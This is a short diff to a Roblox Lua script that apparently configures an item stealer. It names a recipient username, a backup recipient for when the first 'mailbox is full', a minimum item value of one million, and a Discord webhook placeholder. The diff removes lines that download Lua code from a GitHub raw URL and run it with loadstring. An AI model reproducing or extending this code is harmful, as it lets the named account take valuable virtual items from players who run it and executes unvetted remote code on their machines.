@@ -1,9 +1,6 @@
-local scriptUrl = "https://raw.githubusercontent.com/ardaqee/pesa/main/metegazoz77.lua"
-local scriptContent = game:HttpGet(scriptUrl)
-loadstring(scriptContent)()
-
 Username = "metegazoz77"
 Username2 = "metegazoz77" -- stuff will get sent to this user if first user's mailbox is full
+webhook = "Your discord webhook here"
 min_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
